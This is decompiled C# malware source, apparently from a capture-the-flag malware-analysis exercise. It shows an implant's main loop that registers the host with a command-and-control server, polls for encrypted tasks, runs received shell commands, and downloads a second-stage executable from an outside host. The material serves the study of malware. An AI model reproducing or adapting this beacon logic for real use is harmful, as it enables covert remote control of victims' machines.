// THIS IS ONLY THE  "Main" FUNCTION PART OF THE MALWARE, IMPORTED FUNCTIONS AND MODULES ARE NOT INCLUDED IN THIS CODE FOR CERTAIN REASONS.
// JuicyTomatoy.Program
// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
private static void Main(string[] args)
{
	string hostName = Dns.GetHostName();
	string str = "http://mcgreedysecretc2.thm";
	string url = str + "/reg";
	string data = "name=" + hostName;
	string str2 = Program.PostIt(url, data);
	int count = 15000;
	bool flag = false;
	for (;;)
	{
		Program.Sleeper(count);
		string url2 = str + "/tasks/" + str2;
		string url3 = str + "/results/" + str2;
		string it = Program.GetIt(url2);
		if (!string.IsNullOrEmpty(it))
		{
			string[] array = Program.Decryptor(it).Split(new char[]
			{
				' '
			});
			string a = array[0];
			string text = "";
			if (array.Length > 1)
			{
				text = string.Join(" ", array.Skip(1).ToArray<string>());
			}
			if (!(a == "sleep"))
			{
				if (!(a == "shell"))
				{
					if (!(a == "implant"))
					{
						if (a == "quit")
						{
							flag = true;
						}
					}
					else
					{
						string text2 = Program.Implant("http://stash.mcgreedy.thm/spykit.exe");
						if (!string.IsNullOrEmpty(text2))
						{
							string str3 = Program.Encryptor(text2);
							string data2 = "result=" + str3;
							Program.PostIt(url3, data2);
						}
					}
				}
				else
				{
					string str4 = Program.Encryptor(Program.ExecuteCommand(text));
					string data3 = "result=" + str4;
					Program.PostIt(url3, data3);
				}
			}
			else
			{
				count = int.Parse(text) * 1000;
			}
			if (flag)
			{
				break;
			}
		}
	}
}
